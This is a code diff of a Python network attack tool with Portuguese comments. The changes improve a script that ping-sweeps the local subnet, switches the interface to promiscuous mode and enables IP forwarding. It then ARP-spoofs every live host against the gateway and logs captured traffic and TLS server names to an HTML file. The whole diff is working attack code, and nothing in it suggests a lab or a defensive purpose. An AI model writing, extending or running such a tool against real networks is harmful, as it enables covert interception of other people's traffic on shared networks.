@@ -7,7 +7,6 @@ from time import sleep, strftime
 from datetime import datetime
 import fcntl
 import array
-import ipaddress
 import queue
 import time
 
@@ -18,7 +17,6 @@ def enable_ip_forwarding():
     """
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
-# Função para detectar a interface de rede, IP e máscara
 def get_network_info():
     """
     Detecta a interface de rede ativa, IP e máscara de sub-rede.
@@ -44,16 +42,33 @@ def get_network_info():
         except:
             continue
 
-    # Escolhe a primeira interface válida
     if interfaces:
+        # Seleciona a primeira interface válida
         interface_name = interfaces[0][0]
         ip_address = interfaces[0][1]
+        # Obtém a máscara de sub-rede
         netmask = socket.inet_ntoa(fcntl.ioctl(
             sock.fileno(), 0x891b,  # SIOCGIFNETMASK
             struct.pack('256s', interface_name[:15].encode('utf-8')))[20:24])
         return interface_name, ip_address, netmask
     else:
         raise Exception("Não foi possível encontrar uma interface de rede válida.")
+    
+# Função para calcular IPs dentro da sub-rede
+def calculate_subnet_hosts(ip_address, netmask):
+    """
+    Calcula os endereços IPs na sub-rede de acordo com o IP e a máscara.
+    """
+    ip_binary = struct.unpack('!I', socket.inet_aton(ip_address))[0]
+    netmask_binary = struct.unpack('!I', socket.inet_aton(netmask))[0]
+    network_binary = ip_binary & netmask_binary
+    broadcast_binary = network_binary | ~netmask_binary & 0xFFFFFFFF
+
+    # Gera todos os endereços IP entre o endereço de rede e o broadcast
+    return [
+        socket.inet_ntoa(struct.pack('!I', ip))
+        for ip in range(network_binary + 1, broadcast_binary)
+    ]
 
 # Função para obter o endereço do gateway padrão
 def get_default_gateway():
@@ -79,17 +94,18 @@ def ping_worker(ip_queue, active_hosts, lock):
             sock.settimeout(1)
             packet_id = threading.current_thread().ident & 0xFFFF
             icmp_packet = create_icmp_packet(packet_id)
+            start_time = time.time()
             sock.sendto(icmp_packet, (ip, 1))
             response, _ = sock.recvfrom(1024)
+            response_time = (time.time() - start_time) * 1000  # Tempo em milissegundos
             if parse_icmp_reply(response, packet_id):
                 with lock:
-                    if ip not in active_hosts:
-                        active_hosts.append(ip)
-                        log_to_history("historico_ips.txt", ip)
+                    active_hosts.append((ip, response_time))
+                    print(f"[+] Host ativo: {ip} - Tempo de resposta: {response_time:.2f} ms")
         except socket.timeout:
             pass
-        except Exception:
-            pass
+        except Exception as e:
+            print(f"[Erro] {e}")
         finally:
             ip_queue.task_done()
 
@@ -119,7 +135,7 @@ def calculate_checksum(data):
     checksum += (checksum >> 16)
     return ~checksum & 0xFFFF
 
-# Função para parsear respostas ICMP
+# Função para verificar a resposta do ICMP
 def parse_icmp_reply(packet, packet_id):
     """
     Verifica se a resposta ICMP corresponde ao ID do pacote enviado.
@@ -202,6 +218,28 @@ def arp_spoof(target_ip, gateway_ip, interface):
         sock.send(gateway_packet)
         time.sleep(2)
 
+def set_promiscuous_mode(interface, enable=True):
+    """
+    Ativa ou desativa o modo promíscuo na interface de rede de forma segura.
+    """
+    # Abrir um socket para manipular a interface
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    ifr = struct.pack('16sH', interface.encode('utf-8'), 0)  # Estrutura básica de ifreq
+    flags = struct.unpack('16sH', fcntl.ioctl(sock, 0x8913, ifr))[1]  # SIOCGIFFLAGS
+
+    if enable:
+        print(f"[*] Ativando modo promíscuo na interface {interface}")
+        flags |= 0x100  # Ativar o IFF_PROMISC (modo promíscuo)
+    else:
+        print(f"[*] Desativando modo promíscuo na interface {interface}")
+        flags &= ~0x100  # Desativar o IFF_PROMISC (modo promíscuo)
+
+    # Aplicar as alterações
+    ifr = struct.pack('16sH', interface.encode('utf-8'), flags)
+    fcntl.ioctl(sock, 0x8914, ifr)  # SIOCSIFFLAGS
+    sock.close()
+
+
 # Função para capturar tráfego
 def capture_traffic(interface, output_file):
     """
@@ -270,13 +308,13 @@ def capture_traffic(interface, output_file):
             print("\n[INFO] Captura interrompida pelo usuário.")
         f.write("</ul></body></html>\n")
 
-# Função para extrair o Server Name Indication (SNI)
 def extract_sni(tls_data):
     """
     Extrai o Server Name Indication (SNI) de um pacote TLS Client Hello.
     """
     try:
-        if tls_data[0] == 0x16 and tls_data[5] == 0x01:  # TLS Handshake + Client Hello
+        # Verifica se o pacote é um Handshake TLS e contém um Client Hello
+        if tls_data[0] == 0x16 and tls_data[5] == 0x01:  # Registro TLS + Client Hello
             session_id_length = tls_data[43]
             cipher_suites_length = struct.unpack("!H", tls_data[44 + session_id_length:46 + session_id_length])[0]
             extensions_length_start = 46 + session_id_length + cipher_suites_length + 2
@@ -284,19 +322,27 @@ def extract_sni(tls_data):
             extensions_start = extensions_length_start + 2
             extensions_end = extensions_start + extensions_length
 
-            # Iterate over extensions to find SNI
+            # Itera sobre as extensões para encontrar o SNI
             i = extensions_start
             while i < extensions_end:
                 extension_type = struct.unpack("!H", tls_data[i:i + 2])[0]
                 extension_length = struct.unpack("!H", tls_data[i + 2:i + 4])[0]
-                if extension_type == 0x00:  # SNI extension type
+                if extension_type == 0x00:  # Tipo de extensão SNI
                     server_name_length = struct.unpack("!H", tls_data[i + 9:i + 11])[0]
-                    server_name = tls_data[i + 11:i + 11 + server_name_length].decode()
-                    return server_name
+                    server_name_bytes = tls_data[i + 11:i + 11 + server_name_length]
+                    try:
+                        # Tenta decodificar o nome do servidor como UTF-8
+                        server_name = server_name_bytes.decode("utf-8")
+                        return server_name
+                    except UnicodeDecodeError:
+                        # Se falhar, retorna o nome como sequência de bytes
+                        print("[Aviso] Nome do servidor não é UTF-8, retornando bytes.")
+                        return server_name_bytes.hex()
                 i += 4 + extension_length
     except Exception as e:
         print(f"[Erro] Falha ao processar SNI: {e}")
     return None
+
 
 # Função para obter o MAC do atacante
 def get_attacker_mac(interface):
@@ -307,31 +353,44 @@ def get_attacker_mac(interface):
     sock.bind((interface, 0))
     return sock.getsockname()[4]
 
-# Função principal
 def main():
     try:
+        print("[*] Iniciando a aplicação...")
+
         # Detectar informações de rede
-        interface, ip_address, _ = get_network_info()
+        print("[*] Detectando informações de rede...")
+        interface, ip_address, netmask = get_network_info()
+        print(f"    - Interface ativa: {interface}")
+        print(f"    - Endereço IP: {ip_address}")
+        print(f"    - Máscara de sub-rede: {netmask}")
+
+        # Obter o gateway padrão
         gateway_ip = get_default_gateway()
         if not gateway_ip:
             raise Exception("Não foi possível encontrar o gateway padrão.")
+        print(f"    - Gateway padrão: {gateway_ip}")
 
-        # Calcular a rede e o range de IPs (usando /24 para pegar todos os dispositivos da rede)
-        network = ipaddress.ip_network(ip_address + '/24', strict=False)
+        # Calcular os endereços IP na sub-rede
+        print("[*] Calculando os endereços IP na sub-rede...")
+        subnet_hosts = calculate_subnet_hosts(ip_address, netmask)
+        print(f"    - Total de hosts na sub-rede: {len(subnet_hosts)}")
 
         # Habilitar IP Forwarding
         print("[*] Habilitando IP Forwarding...")
         enable_ip_forwarding()
 
+        # Ativar modo promíscuo
+        set_promiscuous_mode(interface, enable=True)
+
         # Varredura de IPs ativos
-        print("[*] Realizando varredura de IPs ativos...")
+        print("[*] Iniciando varredura de IPs ativos...")
         ip_queue = queue.Queue()
         active_hosts = []
         lock = threading.Lock()
 
-        # Adicionar IPs à fila
-        for host in network.hosts():
-            ip_queue.put(str(host))
+        # Adicionar IPs à fila de varredura
+        for ip in subnet_hosts:
+            ip_queue.put(ip)
 
         # Iniciar threads para varredura
         threads = []
@@ -340,27 +399,43 @@ def main():
             t.start()
             threads.append(t)
 
+        # Aguarda a conclusão da varredura
         ip_queue.join()
-
         for t in threads:
             t.join()
 
-        print(f"[+] IPs ativos detectados: {active_hosts}")
+        # Exibir resultados da varredura
+        print("\n[+] Varredura concluída!")
+        print(f"    - Total de hosts ativos: {len(active_hosts)}")
+        for host, response_time in active_hosts:
+            print(f"      * {host} - Tempo de resposta: {response_time:.2f} ms")
 
-        # Iniciar ARP Spoofing
-        print("[*] Iniciando ARP Spoofing...")
-        spoof_threads = []
-        for ip in active_hosts:
-            t = threading.Thread(target=arp_spoof, args=(ip, gateway_ip, interface))
-            spoof_threads.append(t)
-            t.start()
+        # Iniciar ARP Spoofing (caso existam hosts ativos)
+        if active_hosts:
+            print("[*] Iniciando ARP Spoofing...")
+            spoof_threads = []
+            for ip, _ in active_hosts:
+                t = threading.Thread(target=arp_spoof, args=(ip, gateway_ip, interface))
+                spoof_threads.append(t)
+                t.start()
+            print("[*] ARP Spoofing iniciado com sucesso!")
 
-        # Iniciar captura de tráfego
-        print("[*] Capturando tráfego...")
-        capture_traffic(interface, "historico.html")
+        # Captura de tráfego
+        print("[*] Capturando tráfego de rede...")
+        capture_file = "historico.html"
+        capture_traffic(interface, capture_file)
+        print(f"[+] Captura de tráfego salva em: {capture_file}")
 
+    except KeyboardInterrupt:
+        print("\n[INFO] Execução interrompida pelo usuário.")
     except Exception as e:
         print(f"[Erro] {e}")
+    finally:
+        # Desativar modo promíscuo ao final da execução
+        set_promiscuous_mode(interface, enable=False)
+        print("[*] Finalizando a aplicação...")
+
+
 
 if __name__ == "__main__":
     main()
